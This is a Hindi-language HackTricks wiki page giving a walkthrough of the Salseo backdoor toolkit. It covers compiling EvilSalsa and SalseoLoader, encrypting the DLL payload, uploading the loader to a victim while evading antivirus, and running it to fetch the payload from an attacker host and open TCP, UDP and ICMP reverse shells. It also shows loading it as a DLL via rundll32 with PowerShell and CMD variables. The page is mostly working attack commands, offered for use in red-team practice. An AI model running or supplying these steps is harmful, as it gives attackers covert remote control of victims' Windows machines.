# सलसेओ

{% hint style="success" %}
AWS हैकिंग सीखें और अभ्यास करें: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण AWS रेड टीम एक्सपर्ट (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP हैकिंग सीखें और अभ्यास करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण GCP रेड टीम एक्सपर्ट (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>हैकट्रिक्स का समर्थन करें</summary>

* [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जाँच करें!
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** पर **फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें, PRs सबमिट करके** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github रेपो में।

</details>
{% endhint %}

## बाइनरी को कंपाइल करना

गिटहब से स्रोत कोड डाउनलोड करें और **EvilSalsa** और **SalseoLoader** को कंपाइल करें। कोड को कंपाइल करने के लिए **Visual Studio** इंस्टॉल करना होगा।

इन परियोजनाओं को उस विंडोज बॉक्स के आर्किटेक्चर के लिए कंपाइल करें जहां आप उन्हें उपयोग करने जा रहे हैं (यदि विंडोज x64 का समर्थन करता है तो उन्हें उस आर्किटेक्चर के लिए कंपाइल करें)।

आप **Visual Studio** में **बाएं "बिल्ड" टैब** में **"प्लेटफ़ॉर्म टारगेट"** में आर्किटेक्चर का चयन कर सकते हैं।

(\*\*यदि आप इस विकल्प को नहीं ढूंढ सकते तो **"प्रोजेक्ट टैब"** में क्लिक करें और फिर **"\<प्रोजेक्ट नाम> गुणधर्म"** में क्लिक करें)

![](<../.gitbook/assets/image (132).png>)

फिर, दोनों परियोजनाओं को बिल्ड करें (बिल्ड -> समाधान बिल्ड) (लॉग्स के अंदर एक्जीक्यूटेबल का पथ दिखाई देगा):

![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)

## बैकडोर की तैयारी

सबसे पहले, आपको **EvilSalsa.dll** को एन्कोड करने की आवश्यकता होगी। इसे करने के लिए, आप **encrypterassembly.py** पायथन स्क्रिप्ट का उपयोग कर सकते हैं या आप परियोजना **EncrypterAssembly** को कंपाइल कर सकते हैं:

### **पायथन**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows

### विंडोज
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
ठीक है, अब आपके पास सारे जरूरी चीजें हैं जिनकी मदद से आप सारे सालसेओ चीज को क्रियान्वित कर सकते हैं: **एन्कोडेड EvilDalsa.dll** और **SalseoLoader का बाइनरी।**

**मशीन पर SalseoLoader.exe बाइनरी अपलोड करें। इन्हें किसी भी AV द्वारा पहचाना नहीं जाना चाहिए...**

## **बैकडोर को क्रियान्वित करें**

### **TCP रिवर्स शैल (HTTP के माध्यम से एन्कोडेड dll डाउनलोड करना)**

याद रखें कि रिवर्स शैल सुनने वाले के रूप में एनसी शुरू करने और एक HTTP सर्वर चालू करने के लिए एक HTTP सर्वर चालू करें।
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **UDP रिवर्स शैल प्राप्त करना (SMB के माध्यम से एन्कोडेड dll डाउनलोड करना)**

याद रखें कि रिवर्स शैल सुनने वाले के रूप में एनसी शुरू करें, और एन्कोडेड evilsalsa को सेवित करने के लिए एक SMB सर्वर चालित करें (impacket-smbserver)।
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **एक ICMP रिवर्स शैल (एन्कोडेड डीएल पहले से ही पीड़ित के अंदर)**

**इस बार आपको रिवर्स शैल प्राप्त करने के लिए क्लाइंट में एक विशेष उपकरण की आवश्यकता है। डाउनलोड करें:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **ICMP जवाब अक्षम करें:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### क्लाइंट को निष्पादित करें:
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### पीड़ित के अंदर, हम salseo चीज को चलाते हैं:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## Compiling SalseoLoader as DLL exporting main function

विज़ुअल स्टूडियो का उपयोग करके SalseoLoader परियोजना खोलें।

### मुख्य फ़ंक्शन के पहले जोड़ें: \[DllExport]

![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

### इस परियोजना के लिए DllExport इंस्टॉल करें

#### **उपकरण** --> **NuGet पैकेज प्रबंधक** --> **समाधान के लिए NuGet पैकेज स्थापित करें...**

![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

#### **DllExport पैकेज (ब्राउज़ टैब का उपयोग करके) खोजें और स्थापित करें (और पॉपअप स्वीकार करें)**

![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

आपके परियोजना फ़ोल्डर में फ़ाइलें दिखाई देने लगी हैं: **DllExport.bat** और **DllExport\_Configure.bat**

### **U**ninstall DllExport

**अनइंस्टॉल** दबाएं (हाँ, यह अजीब है लेकिन मुझ पर भरोसा करें, यह आवश्यक है)

![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)

### **विज़ुअल स्टूडियो बंद करें और DllExport\_configure चलाएं**

बस **बंद** करें विज़ुअल स्टूडियो

फिर, अपने **SalseoLoader फ़ोल्डर** पर जाएं और **DllExport\_Configure.bat** चलाएं

**x64** का चयन करें (अगर आप इसे x64 बॉक्स के अंदर उपयोग करने जा रहे हैं, तो यह मेरा मामला था), **System.Runtime.InteropServices** का चयन करें (**DllExport के लिए नेमस्पेस** के अंदर) और **Apply** दबाएं

![](<../.gitbook/assets/image (7) (1) (1) (1) (1).png>)

### **परियोजना को फिर से विज़ुअल स्टूडियो के साथ खोलें**

**\[DllExport]** को अब और त्रुटि के रूप में नहीं चिह्नित किया जाना चाहिए

![](<../.gitbook/assets/image (8) (1).png>)

### समाधान तैयार करें

**आउटपुट प्रकार = क्लास लाइब्रेरी** का चयन करें (परियोजना --> SalseoLoader गुण --> एप्लिकेशन --> आउटपुट प्रकार = क्लास लाइब्रेरी)

![](<../.gitbook/assets/image (10) (1).png>)

**x64 प्लेटफ़ॉर्म** का चयन करें (परियोजना --> SalseoLoader गुण --> निर्माण --> प्लेटफ़ॉर्म लक्ष्य = x64)

![](<../.gitbook/assets/image (9) (1) (1).png>)

समाधान **तैयार** करने के लिए: बिल्ड --> समाधान बिल्ड करें (नए DLL का पथ आउटपुट कंसोल के अंदर दिखाई देगा)

### उत्पन्न Dll का परीक्षण करें

जहां आप इसे परीक्षण करना चाहते हैं, वहाँ Dll कॉपी और पेस्ट करें।

चलाएं:
```
rundll32.exe SalseoLoader.dll,main
```
यदि कोई त्रुटि प्रकट नहीं होती है, तो संभावतः आपके पास एक कार्यात्मक DLL है !!

## DLL का उपयोग करके शैल प्राप्त करें

**DLL** का उपयोग करने के लिए एक **HTTP** **सर्वर** और एक **nc** **सुनने वाला** सेट करना न भूलें

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD

### सीएमडी
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
{% hint style="success" %}
सीखें और प्रैक्टिस करें AWS हैकिंग: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण AWS रेड टीम एक्सपर्ट (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
सीखें और प्रैक्टिस करें GCP हैकिंग: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण GCP रेड टीम एक्सपर्ट (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>हैकट्रिक्स का समर्थन करें</summary>

* [**सब्सक्रिप्शन प्लान**](https://github.com/sponsors/carlospolop) की जाँच करें!
* **शामिल हों** 💬 [**डिस्कॉर्ड ग्रुप**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम ग्रुप**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** पर फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें, हैकट्रिक्स**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github रेपो में PR जमा करके।

</details>
{% endhint %}
